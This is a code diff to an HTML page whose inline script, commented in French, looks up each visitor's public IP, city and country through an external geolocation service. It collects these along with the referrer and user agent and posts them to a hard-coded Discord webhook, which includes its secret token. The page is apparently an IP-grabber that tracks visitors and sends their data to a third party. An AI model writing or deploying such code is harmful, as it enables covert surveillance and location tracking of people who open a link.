@@ -7,21 +7,35 @@
 <body>
 <script>
 (async function() {
-  // Récupérer l'IP publique via un service externe
-  async function getPublicIP() {
+  // Récupérer la localisation complète via ipapi
+  async function getGeoData() {
     try {
-      const res = await fetch('https://api.ipify.org?format=json');
+      const res = await fetch('https://ipapi.co/json/');
       const data = await res.json();
-      return data.ip || 'unknown';
+      return {
+        ip: data.ip || 'unknown',
+        city: data.city || 'unknown',
+        country: data.country_name || 'unknown'
+      };
     } catch {
-      return 'unknown';
+      return { ip: 'unknown', city: 'unknown', country: 'unknown' };
     }
   }
+
+  const geo = await getGeoData();
+
+  // Affiche la localisation sur la page
+  document.body.insertAdjacentHTML('afterbegin', 
+    `<p>Votre IP : ${geo.ip}</p>
+     <p>Ville : ${geo.city}</p>
+     <p>Pays : ${geo.country}</p>`);
 
   // Préparer les données à logger
   const logEntry = {
     timestamp: new Date().toISOString(),
-    ip: await getPublicIP(),
+    ip: geo.ip,
+    city: geo.city,
+    country: geo.country,
     referer: document.referrer || 'unknown',
     user_agent: navigator.userAgent || 'unknown',
     additional_info: {
@@ -39,7 +53,7 @@
   // Remplacer cette URL par l'URL de ton webhook
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
   console.log(JSON.stringify(logEntry));
-  
+
   // Envoi des données au webhook
   fetch(WEBHOOK_URL, {
     method: 'POST',
